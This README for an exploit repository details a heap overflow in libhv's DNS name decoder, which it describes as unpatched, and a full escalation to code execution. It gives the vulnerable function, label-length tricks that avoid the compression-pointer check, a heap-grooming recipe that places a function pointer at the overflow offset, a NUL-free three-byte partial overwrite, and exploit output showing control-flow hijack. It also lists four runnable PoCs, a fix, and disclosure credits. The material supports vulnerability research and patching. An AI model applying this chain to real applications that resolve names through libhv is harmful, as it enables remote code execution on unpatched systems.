# 🧨 libhv `dns_name_decode` — From One Malformed DNS Packet to Code Execution

<p align="center">
  <img alt="class" src="https://img.shields.io/badge/class-CWE--787%20%2F%20CWE--125-red">
  <img alt="impact" src="https://img.shields.io/badge/impact-remote%20code%20execution-critical">
  <img alt="status" src="https://img.shields.io/badge/upstream-unpatched-orange">
  <img alt="target" src="https://img.shields.io/badge/target-libhv%201.3.x-blue">
  <img alt="language" src="https://img.shields.io/badge/PoC-C-555">
  <img alt="license" src="https://img.shields.io/badge/license-MIT-green">
</p>

> **A single DNS reply walks the heap, flips a function pointer with a 3-byte
> surgical write, and hands you the instruction pointer.** This repo is the full,
> reproducible chain — crash → RIP control → code execution — against libhv's DNS
> client, with four runnable PoCs and a line-by-line writeup.

---

## TL;DR

Any application built on **[libhv](https://github.com/ithewei/libhv)** that resolves
hostnames (`nslookup()` / `dns_query()` / `dns_unpack()`) trusts the DNS server it
talks to. Feed it one crafted response and `dns_name_decode()` writes attacker bytes
straight off the end of a heap buffer, through the next record, and into whatever
lives in the adjacent chunk. With a little heap feng-shui that neighbor is a
**function pointer**, and the final stage redirects it into attacker-chosen code —
**without ever writing a NUL byte.**

| | |
|---|---|
| **Software** | libhv (`ithewei/libhv`) — the popular C/C++ event-loop network library |
| **Sink** | `protocol/dns.c` → `dns_name_decode()` |
| **Affected** | 1.3.x, git `060a4b6` (2026-10-20) and every prior release — **unpatched as of writing** |
| **Class** | CWE-787 (heap OOB write) · CWE-125 (OOB read) |
| **Reachability** | Remote: any untrusted DNS response on the `UDP:53` path |

> 🤝 **Credit where it's due.** The underlying bug was first reported by **LL-V** in
> [issue #851](https://github.com/ithewei/libhv/issues/851) (2026-07-21), with a fix in
> the still-open [PR #854](https://github.com/ithewei/libhv/pull/854). This package is
> an **independent rediscovery** that adds the full escalation to code execution and a
> runnable PoC. All credit for the original report goes to LL-V — this is the "how far
> can it actually go?" follow-up.

---

## 🐛 The bug, in nine lines

Here's the entire vulnerability. Read it like the CPU does:

```c
int dns_name_decode(const char* buf, char* domain) {
    const char* p = buf;
    int len = *p++;               // signed char: 0xFF -> -1, label math breaks
    int buflen = 1;
    while (*p != '\0') {          // ⚠️ loop stops only at a NUL in the INPUT
        if (len-- == 0) { len = *p; *domain = '.'; }
        else            { *domain = *p; }
        ++p; ++domain; ++buflen;  // ⚠️ writes to *domain with NO bound
    }
    *domain = '\0';
    ++buflen;
    return buflen;
}
```

Two fatal assumptions: the function never learns **how big `domain` is**, and it never
learns **where the packet ends**. It copies until it trips over a NUL *in the attacker's
data*. Upstream, `dns_unpack()` hands it a destination inside a fixed `char name[256]`
living in a `malloc`'d record array:

```c
dns->answers = malloc(nanswer * sizeof(dns_rr_t));  // sizeof(dns_rr_t) == 280
// ... answers[0].name  is  char[256]  at the front of that chunk
```

A name longer than 256 bytes writes **forward** — out of `name[]`, through the rest of
the record, and past the allocation into the next heap chunk. Attacker-controlled bytes,
length bounded only by the packet. 🎯

---

## ⛓️ The exploit chain — three puzzles

Getting from "it overflows" to "it runs my code" means solving three constraints the
parser and the allocator impose. This is the fun part.

### 🧩 Puzzle 1 — You can't use `0xFF` to overflow

The obvious move is a giant label length. But libhv checks for DNS **compression
pointers** first:

```c
if (*(uint8_t*)p >= 192) { /* 0xC0+ => pointer, bail out */ }
```

So any length byte `>= 0xC0` never reaches the vulnerable loop. The workaround:
**`0x3F` (63) — the largest *legal* label length.** Chain six of them:

```
6 labels × 63 bytes + 5 dots = 383 decoded bytes
dots land at offsets 63 / 127 / 191 / 255 / 319
→ offsets 288..295 are eight consecutive attacker-chosen bytes
```

### 🧩 Puzzle 2 — Put a function pointer exactly where the write lands

glibc places two back-to-back `malloc(280)` chunks **0x120 bytes apart**. Groom the
heap so the victim object — one holding a **function pointer** at its start — sits right
behind the record being decoded:

```
A = malloc(280)      # chunk at X
B = malloc(280)      # victim at X+0x120;  B[0] is a function pointer
free(A)              # A -> tcache
dns_unpack(...)      # answers = malloc(280) reuses A  =>  answers == A, B at +0x120
# the long name overflows answers[0].name forward and lands on B[0]
```

Offsets 288..295 of the decode output map precisely onto `B[0]`. ✅

### 🧩 Puzzle 3 — Code execution *without a single NUL byte*

`dns_name_decode` can't emit `0x00` — a NUL in the output is where it stops. So a full
8-byte x86-64 pointer is impossible to write. But on a **non-PIE** binary a code
pointer's top five bytes are *already* `0x00`. So we don't need them — a **3-byte
partial overwrite** of the low bytes is enough to repoint the pointer:

```
[*] win() at 0x401830 (low3 = 30 18 40)
[*] dns_unpack returned 319, B[0] = 0x401830
[*] PWNED: attacker redirected control flow into win()
[TURKY] arbitrary code execution
uid=1000(kali) gid=1000(kali) groups=1000(kali),65534(nogroup)
```

The label stream plants `win`'s low three bytes at offsets 288–290 and a **NUL at 291**
— stopping the copy the instant after the overwrite. Clean redirect, no corruption past
the target. 🏁

---

## 🚀 Build and run

```bash
./build.sh          # clones libhv, generates hconfig.h, compiles all four PoCs
```

| PoC | What it proves |
|---|---|
| 💥 `pocs/dns_overflow_poc.c` | ASAN heap-buffer-overflow (write) — the raw bug |
| 👓 `pocs/dns_read_poc.c` | ASAN stack-buffer-overflow (read) — the missing terminator |
| 🎮 `pocs/dns_hijack_poc.c` | function pointer → `0x4141414141414141`, full RIP control |
| 🧨 `pocs/dns_exec_poc.c` | partial-overwrite redirect → code execution |

> `dns_exec_poc.c` builds **without ASAN** (redzones break the heap adjacency); the
> others are ASAN builds. `build.sh` handles both automatically.

---

## 🔧 The fix

Give the decoder the context it's missing:

- Pass the **destination size** in and cap writes at `name[256]`.
- Pass the **packet bounds** in and never read past them.
- Enforce the wire-format limits: **≤ 63 per label, ≤ 255 total name**.
- Advance the packet cursor by the **wire length**, not the decoded character count.
- Validate every count field (`nanswer`, label lengths) **before** trusting it.

See [PR #854](https://github.com/ithewei/libhv/pull/854) for the maintainer's own patch.

---

## 📜 Disclosure & ethics

- **Original report:** [libhv issue #851](https://github.com/ithewei/libhv/issues/851) — LL-V, 2026-07-21.
- **Fix:** [PR #854](https://github.com/ithewei/libhv/pull/854) — open / unmerged.
- **This package:** independent reproduction + exploit escalation, published for
  documentation and responsible disclosure.
- **No live targets** were or should be involved. Every PoC runs against a local harness
  you build yourself. Use it to understand the bug, test your own software, and ship the
  fix — nothing else.

📄 Licensed under the [MIT License](LICENSE).
